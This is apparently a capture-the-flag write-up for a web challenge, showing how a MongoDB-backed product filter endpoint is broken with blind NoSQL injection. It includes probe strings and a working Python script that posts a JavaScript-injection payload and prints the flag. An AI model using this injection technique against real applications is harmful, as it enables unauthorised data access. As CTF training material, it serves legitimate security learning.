# web 4 - Walmart!
https://ctftime.org/event/2179/

blind challenge
the vulnerability is in `/api/products/filter`

You can see that by doing either `'` or `\\` on the category field and seeing that the server returns a 500.
If you have familiarity with nosql db I think it gets very obvious what the issue is.
I dont have that if you dont then you have to try a lot of stuff and see what gives 500 and what doesnt.

so after some trial and error I got to
hardware\u0027\u0000
and then to
hardware\u0027;\u0000
eventually to 
hardware\u0027sleep()\u0000
and then to
https://www.mongodb.com/docs/manual/reference/operator/query/where/
and then it was easy

```python
import requests, sys

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Accept': '*/*',
    'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://184356e.678470.xyz/shop',
    'Content-Type': 'application/json',
    'Origin': 'http://184356e.678470.xyz',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
}

json_data = {
    'category': 'hardware\u0027;return this;\u0000',
    'price_order': 'low_to_high',
}

response = requests.post('http://e770288.678470.xyz/api/products/filter', headers=headers, json=json_data)
print(f"{response.text}")
```

wxmctf{why_bl1nd_sql_1nj3ct10n}
